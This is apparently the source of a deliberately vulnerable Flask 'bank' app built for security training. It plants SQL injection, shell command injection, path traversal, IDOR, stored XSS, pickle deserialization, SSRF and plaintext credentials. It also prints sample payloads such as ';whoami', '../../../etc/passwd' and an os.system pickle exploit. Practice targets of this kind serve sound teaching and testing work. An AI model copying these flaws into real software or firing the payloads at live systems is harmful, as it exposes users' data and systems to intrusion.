from flask import Flask, render_template, request, redirect, session, jsonify
import sqlite3
import subprocess
import os
import pickle
import base64

app = Flask(__name__)
app.secret_key = 'insecure_key_12345'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////app/app.db'

# Inicializar base de datos simple
def init_db():
    conn = sqlite3.connect('/app/app.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            email TEXT,
            is_admin INTEGER,
            balance REAL,
            ssn TEXT
        )
    ''')
    
    # Insertar usuarios de prueba si no existen
    cursor.execute("SELECT COUNT(*) FROM user")
    if cursor.fetchone()[0] == 0:
        users = [
            (1, 'admin', 'admin123', 'admin@bank.com', 1, 1000000.0, '123-45-6789'),
            (2, 'alice', 'password123', 'alice@bank.com', 0, 5000.0, '987-65-4321'),
            (3, 'bob', 'qwerty', 'bob@bank.com', 0, 3000.0, '456-78-9123')
        ]
        cursor.executemany('INSERT INTO user VALUES (?,?,?,?,?,?,?)', users)
    
    conn.commit()
    conn.close()

# ================= RUTAS VULNERABLES =================

@app.route('/')
def index():
    return '''
    <h1>🏦 Vulnerable Bank App</h1>
    <p>Application is running!</p>
    
    <h3>Vulnerability Tests:</h3>
    <ul>
        <li><a href="/search?q=test">SQL Injection Test</a></li>
        <li><a href="/ping?host=127.0.0.1">Command Injection Test</a></li>
        <li><a href="/download?file=test.txt">Path Traversal Test</a></li>
        <li><a href="/api/users/1">IDOR Test</a></li>
        <li><a href="/comments">XSS Test</a></li>
    </ul>
    
    <h3>Default Credentials:</h3>
    <ul>
        <li>admin / admin123</li>
        <li>alice / password123</li>
        <li>bob / qwerty</li>
    </ul>
    
    <h3>Quick Exploits:</h3>
    <pre>
SQLi: /search?q=' OR '1'='1
CMDi: /ping?host=;whoami
Path Traversal: /download?file=../../../etc/passwd
IDOR: /api/users/2
XSS: POST /comment with &lt;script&gt;alert(1)&lt;/script&gt;
    </pre>
    '''

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # SQL Injection vulnerable
    conn = sqlite3.connect('/app/app.db')
    cursor = conn.cursor()
    try:
        cursor.execute(f"SELECT * FROM user WHERE username LIKE '%{query}%' OR email LIKE '%{query}%'")
        results = cursor.fetchall()
        conn.close()
        
        html = '<h2>Search Results</h2>'
        if results:
            html += '<table border="1"><tr><th>ID</th><th>Username</th><th>Password</th><th>Email</th><th>Balance</th><th>SSN</th></tr>'
            for row in results:
                html += f'<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[5]}</td><td>{row[6]}</td></tr>'
            html += '</table>'
        else:
            html += '<p>No results found</p>'
        return html
    except Exception as e:
        return f'<pre>Error: {str(e)}</pre>'

@app.route('/ping')
def ping():
    host = request.args.get('host', '127.0.0.1')
    # Command Injection vulnerable
    try:
        output = subprocess.check_output(f"ping -c 2 {host}", shell=True, text=True, stderr=subprocess.STDOUT)
        return f'<pre>{output}</pre>'
    except Exception as e:
        return f'<pre>Error: {str(e)}</pre>'

@app.route('/download')
def download():
    filename = request.args.get('file', 'test.txt')
    # Path Traversal vulnerable
    try:
        # Primero intentar path normal
        filepath = os.path.join('/app/uploads', filename)
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                return f'<pre>{f.read()}</pre>'
        else:
            # Intentar path traversal
            with open(filename, 'r') as f:
                return f'<pre>{f.read()}</pre>'
    except Exception as e:
        return f'<pre>Error: {str(e)}<br>Try: /download?file=../../../etc/passwd</pre>'

@app.route('/api/users/<int:user_id>')
def get_user(user_id):
    # IDOR vulnerable - no authorization
    conn = sqlite3.connect('/app/app.db')
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM user WHERE id = {user_id}")
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return jsonify({
            'id': user[0],
            'username': user[1],
            'password': user[2],
            'email': user[3],
            'is_admin': bool(user[4]),
            'balance': user[5],
            'ssn': user[6]  # Exposing SSN!
        })
    return jsonify({'error': 'User not found'}), 404

@app.route('/comment', methods=['GET', 'POST'])
def comment():
    if request.method == 'POST':
        comment_text = request.form.get('comment', '')
        # XSS Storage vulnerable
        with open('/app/comments.txt', 'a') as f:
            f.write(f"{comment_text}\n")
        return redirect('/comments')
    
    return '''
    <form method="POST">
        <textarea name="comment" rows="4" cols="50"></textarea><br>
        <input type="submit" value="Post Comment">
    </form>
    '''

@app.route('/comments')
def view_comments():
    # XSS vulnerable - no sanitization
    comments = []
    if os.path.exists('/app/comments.txt'):
        with open('/app/comments.txt', 'r') as f:
            comments = f.readlines()
    
    html = '<h2>Comments</h2>'
    for comment in comments:
        html += f'<div class="comment">{comment}</div><hr>'
    html += '<a href="/comment">Add Comment</a>'
    return html

@app.route('/import_profile', methods=['GET', 'POST'])
def import_profile():
    if request.method == 'POST':
        profile_data = request.form.get('data', '')
        # Insecure Deserialization vulnerable
        try:
            profile = pickle.loads(base64.b64decode(profile_data))
            return f'<pre>Profile loaded: {profile}</pre>'
        except Exception as e:
            return f'<pre>Error: {str(e)}</pre>'
    
    return '''
    <form method="POST">
        <textarea name="data" rows="4" cols="50" placeholder="Base64 encoded pickle data"></textarea><br>
        <input type="submit" value="Import Profile">
    </form>
    <pre>
Example exploit:
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
    </pre>
    '''

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url', 'http://example.com')
    # SSRF vulnerable
    import requests
    try:
        response = requests.get(url, timeout=5)
        return f'<pre>Status: {response.status_code}\n\n{response.text[:1000]}</pre>'
    except Exception as e:
        return f'<pre>Error: {str(e)}</pre>'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Broken authentication - plain text comparison
        conn = sqlite3.connect('/app/app.db')
        cursor = conn.cursor()
        cursor.execute(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
        user = cursor.fetchone()
        conn.close()
        
        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            session['is_admin'] = user[4]
            return redirect('/dashboard')
        else:
            return 'Invalid credentials!<br><a href="/login">Try again</a>'
    
    return '''
    <form method="POST">
        <input type="text" name="username" placeholder="Username"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <input type="submit" value="Login">
    </form>
    '''

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect('/login')
    
    return f'''
    <h2>Dashboard - Welcome {session['username']}</h2>
    <p>User ID: {session['user_id']}</p>
    <p>Admin: {session['is_admin']}</p>
    <a href="/">Home</a> | <a href="/logout">Logout</a>
    '''

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/admin')
def admin():
    if not session.get('is_admin'):
        return 'Access Denied!', 403
    
    conn = sqlite3.connect('/app/app.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM user")
    users = cursor.fetchall()
    conn.close()
    
    html = '<h2>Admin Panel</h2><table border="1">'
    html += '<tr><th>ID</th><th>Username</th><th>Password</th><th>Email</th><th>Admin</th><th>Balance</th><th>SSN</th></tr>'
    for user in users:
        html += f'<tr><td>{user[0]}</td><td>{user[1]}</td><td>{user[2]}</td><td>{user[3]}</td><td>{user[4]}</td><td>{user[5]}</td><td>{user[6]}</td></tr>'
    html += '</table>'
    return html

if __name__ == '__main__':
    # Crear directorio de uploads y archivos de prueba
    os.makedirs('/app/uploads', exist_ok=True)
    
    # Crear archivo de prueba para path traversal
    with open('/app/uploads/test.txt', 'w') as f:
        f.write('This is a test file for path traversal.\n')
        f.write('Try: /download?file=../../../etc/passwd\n')
        f.write('Or: /download?file=/app/app.py\n')
    
    # Crear archivo de comentarios
    if not os.path.exists('/app/comments.txt'):
        with open('/app/comments.txt', 'w') as f:
            f.write('<script>alert("XSS Test")</script>\n')
    
    # Inicializar base de datos
    init_db()
    
    print("Starting Vulnerable Bank App on http://0.0.0.0:8080")
    print("Default credentials: admin/admin123, alice/password123, bob/qwerty")
    app.run(host='0.0.0.0', port=8080, debug=True)

